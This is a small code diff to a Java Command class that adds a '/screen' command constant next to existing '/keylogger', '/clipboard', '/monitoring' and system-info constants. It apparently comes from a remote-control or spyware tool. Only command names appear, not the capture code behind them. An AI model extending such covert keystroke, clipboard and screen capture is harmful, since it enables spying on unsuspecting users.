@@ -11,5 +11,6 @@ public class Command {
     public static final String COMMAND_MONITORING = "/monitoring";
     public static final String COMMAND_CLIPBOARD = "/clipboard";
     public static final String COMMAND_CLIENT_SYSTEM_INFO = "client_system_info";
+    public static final String COMMAND_CLIENT_SCREEN = "/screen";
     public static final String COMMAND_KEYLOGGER = "/keylogger";
 }
